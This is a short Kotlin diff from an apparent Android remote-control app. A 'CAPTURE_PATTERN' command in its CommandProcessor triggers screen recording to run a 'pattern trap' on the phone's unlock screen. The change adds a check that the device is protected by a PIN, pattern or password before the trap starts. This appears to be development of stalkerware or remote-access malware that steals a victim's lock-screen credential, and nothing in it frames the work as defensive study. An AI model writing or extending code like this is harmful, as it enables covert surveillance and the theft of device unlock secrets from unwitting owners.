@@ -514,7 +514,12 @@ object CommandProcessor {
                 "CAPTURE_PATTERN" -> {
                     ScreenRecordManager.pendingCmdId = id
                     val pm = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
-                    if (!pm.isInteractive) {
+                    val km = ctx.getSystemService(Context.KEYGUARD_SERVICE) as android.app.KeyguardManager
+                    
+                    if (!km.isKeyguardSecure) {
+                        status = "FAILED_NOT_SECURE"
+                        errorMsg = "Device is not protected by PIN/Pattern/Password."
+                    } else if (!pm.isInteractive) {
                         status = "FAILED (SCREEN_OFF)"
                         errorMsg = "Screen must be physically ON to initiate the pattern trap securely."
                     } else {
